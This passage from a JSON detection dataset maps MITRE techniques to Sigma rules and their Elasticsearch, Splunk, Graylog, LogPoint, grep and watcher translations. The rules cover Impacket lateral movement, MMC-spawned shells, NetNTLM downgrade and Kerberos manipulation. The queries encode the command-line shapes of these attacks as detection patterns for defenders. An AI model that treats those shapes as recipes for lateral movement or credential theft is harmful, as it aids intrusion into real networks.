*Windows\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*&1)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((ParentImage.keyword:(*\\\\\\\\\\\\\\\\wmiprvse.exe OR *\\\\\\\\\\\\\\\\mmc.exe OR *\\\\\\\\\\\\\\\\explorer.exe OR *\\\\\\\\\\\\\\\\services.exe) AND CommandLine.keyword:(*cmd.exe*\\\\\\\\ \\\\\\\\/Q\\\\\\\\ \\\\\\\\/c\\\\\\\\ *\\\\\\\\ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\127.0.0.1\\\\\\\\\\\\\\\\*&1*)) OR (ParentCommandLine.keyword:(*svchost.exe\\\\\\\\ \\\\\\\\-k\\\\\\\\ netsvcs OR taskeng.exe*) AND CommandLine.keyword:(cmd.exe\\\\\\\\ \\\\\\\\/C\\\\\\\\ *Windows\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*&1)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Impacket Lateralization Detection\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((ParentImage.keyword:(*\\\\\\\\wmiprvse.exe *\\\\\\\\mmc.exe *\\\\\\\\explorer.exe *\\\\\\\\services.exe) AND CommandLine.keyword:(*cmd.exe* \\\\/Q \\\\/c * \\\\\\\\\\\\\\\\127.0.0.1\\\\\\\\*&1*)) OR (ParentCommandLine.keyword:(*svchost.exe \\\\-k netsvcs taskeng.exe*) AND CommandLine.keyword:(cmd.exe \\\\/C *Windows\\\\\\\\Temp\\\\\\\\*&1)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((ParentImage=\"*\\\\\\\\wmiprvse.exe\" OR ParentImage=\"*\\\\\\\\mmc.exe\" OR ParentImage=\"*\\\\\\\\explorer.exe\" OR ParentImage=\"*\\\\\\\\services.exe\") (CommandLine=\"*cmd.exe* /Q /c * \\\\\\\\\\\\\\\\127.0.0.1\\\\\\\\*&1*\")) OR ((ParentCommandLine=\"*svchost.exe -k netsvcs\" OR ParentCommandLine=\"taskeng.exe*\") (CommandLine=\"cmd.exe /C *Windows\\\\\\\\Temp\\\\\\\\*&1\"))) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((ParentImage IN [\"*\\\\\\\\wmiprvse.exe\", \"*\\\\\\\\mmc.exe\", \"*\\\\\\\\explorer.exe\", \"*\\\\\\\\services.exe\"] CommandLine IN [\"*cmd.exe* /Q /c * \\\\\\\\\\\\\\\\127.0.0.1\\\\\\\\*&1*\"]) OR (ParentCommandLine IN [\"*svchost.exe -k netsvcs\", \"taskeng.exe*\"] CommandLine IN [\"cmd.exe /C *Windows\\\\\\\\Temp\\\\\\\\*&1\"])))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*(?:.*.*\\\\wmiprvse\\\\.exe|.*.*\\\\mmc\\\\.exe|.*.*\\\\explorer\\\\.exe|.*.*\\\\services\\\\.exe))(?=.*(?:.*.*cmd\\\\.exe.* /Q /c .* \\\\\\\\\\\\\\\\127\\\\.0\\\\.0\\\\.1\\\\\\\\.*&1.*)))|.*(?:.*(?=.*(?:.*.*svchost\\\\.exe -k netsvcs|.*taskeng\\\\.exe.*))(?=.*(?:.*cmd\\\\.exe /C .*Windows\\\\\\\\Temp\\\\\\\\.*&1)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: MMC Spawning Windows Shell\nid: 05a2ab7e-ce11-4b63-86db-ab32e763e11d\nstatus: experimental\ndescription: Detects a Windows command line executable started from MMC.\nauthor: Karneades, Swisscom CSIRT\ntags:\n    - attack.lateral_movement\n    - attack.t1175\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\mmc.exe'\n        Image:\n            - '*\\cmd.exe'\n            - '*\\powershell.exe'\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n            - '*\\sh.exe'\n            - '*\\bash.exe'\n            - '*\\reg.exe'\n            - '*\\regsvr32.exe'\n            - '*\\BITSADMIN*'\n    condition: selection\nfields:\n    - CommandLine\n    - Image\n    - ParentCommandLine\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: MMC Spawning Windows Shell\nid: 05a2ab7e-ce11-4b63-86db-ab32e763e11d\nstatus: experimental\ndescription: Detects a Windows command line executable started from MMC.\nauthor: Karneades, Swisscom CSIRT\ntags:\n    - attack.lateral_movement\n    - attack.t1175\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\mmc.exe'\n        Image:\n            - '*\\cmd.exe'\n            - '*\\powershell.exe'\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n            - '*\\sh.exe'\n            - '*\\bash.exe'\n            - '*\\reg.exe'\n            - '*\\regsvr32.exe'\n            - '*\\BITSADMIN*'\n    condition: selection\nfields:\n    - CommandLine\n    - Image\n    - ParentCommandLine\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\mmc.exe AND Image.keyword:(*\\\\\\\\cmd.exe OR *\\\\\\\\powershell.exe OR *\\\\\\\\wscript.exe OR *\\\\\\\\cscript.exe OR *\\\\\\\\sh.exe OR *\\\\\\\\bash.exe OR *\\\\\\\\reg.exe OR *\\\\\\\\regsvr32.exe OR *\\\\\\\\BITSADMIN*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/MMC-Spawning-Windows-Shell <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"MMC Spawning Windows Shell\",\\n    \"description\": \"Detects a Windows command line executable started from MMC.\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1175\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\mmc.exe AND Image.keyword:(*\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\sh.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\reg.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\BITSADMIN*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\mmc.exe AND Image.keyword:(*\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\sh.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\reg.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\BITSADMIN*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'MMC Spawning Windows Shell\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\n            Image = {{_source.Image}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:*\\\\\\\\mmc.exe AND Image.keyword:(*\\\\\\\\cmd.exe *\\\\\\\\powershell.exe *\\\\\\\\wscript.exe *\\\\\\\\cscript.exe *\\\\\\\\sh.exe *\\\\\\\\bash.exe *\\\\\\\\reg.exe *\\\\\\\\regsvr32.exe *\\\\\\\\BITSADMIN*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\mmc.exe\" (Image=\"*\\\\\\\\cmd.exe\" OR Image=\"*\\\\\\\\powershell.exe\" OR Image=\"*\\\\\\\\wscript.exe\" OR Image=\"*\\\\\\\\cscript.exe\" OR Image=\"*\\\\\\\\sh.exe\" OR Image=\"*\\\\\\\\bash.exe\" OR Image=\"*\\\\\\\\reg.exe\" OR Image=\"*\\\\\\\\regsvr32.exe\" OR Image=\"*\\\\\\\\BITSADMIN*\")) | table CommandLine,Image,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\mmc.exe\" Image IN [\"*\\\\\\\\cmd.exe\", \"*\\\\\\\\powershell.exe\", \"*\\\\\\\\wscript.exe\", \"*\\\\\\\\cscript.exe\", \"*\\\\\\\\sh.exe\", \"*\\\\\\\\bash.exe\", \"*\\\\\\\\reg.exe\", \"*\\\\\\\\regsvr32.exe\", \"*\\\\\\\\BITSADMIN*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\mmc\\\\.exe)(?=.*(?:.*.*\\\\cmd\\\\.exe|.*.*\\\\powershell\\\\.exe|.*.*\\\\wscript\\\\.exe|.*.*\\\\cscript\\\\.exe|.*.*\\\\sh\\\\.exe|.*.*\\\\bash\\\\.exe|.*.*\\\\reg\\\\.exe|.*.*\\\\regsvr32\\\\.exe|.*.*\\\\BITSADMIN.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Processes created by MMC\nstatus: experimental\ndescription: Processes started by MMC could be a sign of lateral movement using MMC application COM object\nreferences:\n    - https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\ntags:\n    - attack.lateral_movement\n    - attack.t1175\n    - car.2013-02-003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\mmc.exe'\n        Image: '*\\cmd.exe'\n    exclusion:\n        CommandLine: '*\\RunCmd.cmd'\n    condition: selection and not exclusion\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Processes created by MMC\nstatus: experimental\ndescription: Processes started by MMC could be a sign of lateral movement using MMC application COM object\nreferences:\n    - https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\ntags:\n    - attack.lateral_movement\n    - attack.t1175\n    - car.2013-02-003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\mmc.exe'\n        Image: '*\\cmd.exe'\n    exclusion:\n        CommandLine: '*\\RunCmd.cmd'\n    condition: selection and not exclusion\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((ParentImage.keyword:*\\\\\\\\mmc.exe AND Image.keyword:*\\\\\\\\cmd.exe) AND (NOT (CommandLine.keyword:*\\\\\\\\RunCmd.cmd)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Processes-created-by-MMC <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Processes created by MMC\",\\n    \"description\": \"Processes started by MMC could be a sign of lateral movement using MMC application COM object\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1175\",\\n      \"car.2013-02-003\"\\n    ],\\n    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\mmc.exe AND Image.keyword:*\\\\\\\\\\\\\\\\cmd.exe) AND (NOT (CommandLine.keyword:*\\\\\\\\\\\\\\\\RunCmd.cmd)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\mmc.exe AND Image.keyword:*\\\\\\\\\\\\\\\\cmd.exe) AND (NOT (CommandLine.keyword:*\\\\\\\\\\\\\\\\RunCmd.cmd)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Processes created by MMC\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((ParentImage:\"*\\\\\\\\mmc.exe\" AND Image:\"*\\\\\\\\cmd.exe\") AND NOT (CommandLine:\"*\\\\\\\\RunCmd.cmd\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\mmc.exe\" Image=\"*\\\\\\\\cmd.exe\") NOT (CommandLine=\"*\\\\\\\\RunCmd.cmd\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((ParentImage=\"*\\\\\\\\mmc.exe\" Image=\"*\\\\\\\\cmd.exe\")  -(CommandLine=\"*\\\\\\\\RunCmd.cmd\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*.*\\\\mmc\\\\.exe)(?=.*.*\\\\cmd\\\\.exe)))(?=.*(?!.*(?:.*(?=.*.*\\\\RunCmd\\\\.cmd)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "ET NETBIOS DCERPC DCOM ShellExecute - Likely Lateral Movement", "product": "Suricata (NSM)", "name": "ET Pro Rule"}, {"query": "ET NETBIOS DCERPC DCOM ExecuteShellCommand Call - Likely Lateral Movement", "product": "Suricata (NSM)", "name": "ET Pro Rule"}, {"query": "ET TROJAN PSEmpire Checkin via POST", "product": "Suricata (NSM)", "name": "ET Open Rule"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1212", "parsed_datasets": [], "queries": [{"query": "action: global\ntitle: NetNTLM Downgrade Attack\nid: d67572a0-e2ec-45d6-b8db-c100d14b8ef2\ndescription: Detects post exploitation using NetNTLM downgrade attacks\nreferences:\n    - https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks\nauthor: Florian Roth\ndate: 2018/03/20\ntags:\n    - attack.credential_access\n    - attack.t1212\ndetection:\n    condition: 1 of them\nfalsepositives:\n    - Unknown\nlevel: critical\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "action: global\ntitle: NetNTLM Downgrade Attack\nid: d67572a0-e2ec-45d6-b8db-c100d14b8ef2\ndescription: Detects post exploitation using NetNTLM downgrade attacks\nreferences:\n    - https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks\nauthor: Florian Roth\ndate: 2018/03/20\ntags:\n    - attack.credential_access\n    - attack.t1212\ndetection:\n    condition: 1 of them\nfalsepositives:\n    - Unknown\nlevel: critical\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\lmcompatibilitylevel OR *SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\NtlmMinClientSec OR *SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\RestrictSendingNTLMTraffic))\\n(EventID:\"4657\" AND ObjectName.keyword:\\\\\\\\REGISTRY\\\\\\\\MACHINE\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa AND ObjectValueName:(\"LmCompatibilityLevel\" OR \"NtlmMinClientSec\" OR \"RestrictSendingNTLMTraffic\"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/NetNTLM-Downgrade-Attack <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"NetNTLM Downgrade Attack\",\\n    \"description\": \"Detects post exploitation using NetNTLM downgrade attacks\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1212\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*SYSTEM\\\\\\\\\\\\\\\\*ControlSet*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa\\\\\\\\\\\\\\\\lmcompatibilitylevel OR *SYSTEM\\\\\\\\\\\\\\\\*ControlSet*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa\\\\\\\\\\\\\\\\NtlmMinClientSec OR *SYSTEM\\\\\\\\\\\\\\\\*ControlSet*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa\\\\\\\\\\\\\\\\RestrictSendingNTLMTraffic))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*SYSTEM\\\\\\\\\\\\\\\\*ControlSet*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa\\\\\\\\\\\\\\\\lmcompatibilitylevel OR *SYSTEM\\\\\\\\\\\\\\\\*ControlSet*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa\\\\\\\\\\\\\\\\NtlmMinClientSec OR *SYSTEM\\\\\\\\\\\\\\\\*ControlSet*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa\\\\\\\\\\\\\\\\RestrictSendingNTLMTraffic))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'NetNTLM Downgrade Attack\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/NetNTLM-Downgrade-Attack-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"NetNTLM Downgrade Attack\",\\n    \"description\": \"Detects post exploitation using NetNTLM downgrade attacks\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1212\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4657\\\\\" AND ObjectName.keyword:\\\\\\\\\\\\\\\\REGISTRY\\\\\\\\\\\\\\\\MACHINE\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\\\\\\\\\*ControlSet*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa AND ObjectValueName:(\\\\\"LmCompatibilityLevel\\\\\" OR \\\\\"NtlmMinClientSec\\\\\" OR \\\\\"RestrictSendingNTLMTraffic\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4657\\\\\" AND ObjectName.keyword:\\\\\\\\\\\\\\\\REGISTRY\\\\\\\\\\\\\\\\MACHINE\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\\\\\\\\\*ControlSet*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa AND ObjectValueName:(\\\\\"LmCompatibilityLevel\\\\\" OR \\\\\"NtlmMinClientSec\\\\\" OR \\\\\"RestrictSendingNTLMTraffic\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'NetNTLM Downgrade Attack\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\lmcompatibilitylevel *SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\NtlmMinClientSec *SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\RestrictSendingNTLMTraffic))\\n(EventID:\"4657\" AND ObjectName.keyword:\\\\\\\\REGISTRY\\\\\\\\MACHINE\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa AND ObjectValueName:(\"LmCompatibilityLevel\" \"NtlmMinClientSec\" \"RestrictSendingNTLMTraffic\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" (TargetObject=\"*SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\lmcompatibilitylevel\" OR TargetObject=\"*SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\NtlmMinClientSec\" OR TargetObject=\"*SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\RestrictSendingNTLMTraffic\"))\\n(EventID=\"4657\" ObjectName=\"\\\\\\\\REGISTRY\\\\\\\\MACHINE\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\" (ObjectValueName=\"LmCompatibilityLevel\" OR ObjectValueName=\"NtlmMinClientSec\" OR ObjectValueName=\"RestrictSendingNTLMTraffic\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject IN [\"*SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\lmcompatibilitylevel\", \"*SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\NtlmMinClientSec\", \"*SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\RestrictSendingNTLMTraffic\"])\\n(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4657\" ObjectName=\"\\\\\\\\REGISTRY\\\\\\\\MACHINE\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Control\\\\\\\\Lsa\" ObjectValueName IN [\"LmCompatibilityLevel\", \"NtlmMinClientSec\", \"RestrictSendingNTLMTraffic\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*(?:.*.*SYSTEM\\\\\\\\.*ControlSet.*\\\\Control\\\\Lsa\\\\lmcompatibilitylevel|.*.*SYSTEM\\\\\\\\.*ControlSet.*\\\\Control\\\\Lsa\\\\NtlmMinClientSec|.*.*SYSTEM\\\\\\\\.*ControlSet.*\\\\Control\\\\Lsa\\\\RestrictSendingNTLMTraffic)))'\\ngrep -P '^(?:.*(?=.*4657)(?=.*\\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\\\\\.*ControlSet.*\\\\Control\\\\Lsa)(?=.*(?:.*LmCompatibilityLevel|.*NtlmMinClientSec|.*RestrictSendingNTLMTraffic)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Kerberos Manipulation\nid: f7644214-0eb0-4ace-9455-331ec4c09253\ndescription: This method triggers on rare Kerberos Failure Codes caused by manipulations of Kerberos messages\nauthor: Florian Roth\ntags:\n    - attack.credential_access\n    - attack.t1212\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n          - 675\n          - 4768\n          - 4769\n          - 4771\n        FailureCode:\n          - '0x9'\n          - '0xA'\n          - '0xB'\n          - '0xF'\n          - '0x10'\n          - '0x11'\n          - '0x13'\n          - '0x14'\n          - '0x1A'\n          - '0x1F'\n          - '0x21'\n          - '0x22'\n          - '0x23'\n          - '0x24'\n          - '0x26'\n          - '0x27'\n          - '0x28'\n          - '0x29'\n          - '0x2C'\n          - '0x2D'\n          - '0x2E'\n          - '0x2F'\n          - '0x31'\n          - '0x32'\n          - '0x3E'\n          - '0x3F'\n          - '0x40'\n          - '0x41'\n          - '0x43'\n          - '0x44'\n    condition: selection\nfalsepositives:\n    - Faulty legacy applications\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Kerberos Manipulation\nid: f7644214-0eb0-4ace-9455-331ec4c09253\ndescription: This method triggers on rare Kerberos Failure Codes caused by manipulations of Kerberos messages\nauthor: Florian Roth\ntags:\n    - attack.credential_access\n    - attack.t1212\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n          - 675\n          - 4768\n          - 4769\n          - 4771\n        FailureCode:\n          - '0x9'\n          - '0xA'\n          - '0xB'\n          - '0xF'\n          - '0x10'\n          - '0x11'\n          - '0x13'\n          - '0x14'\n          - '0x1A'\n    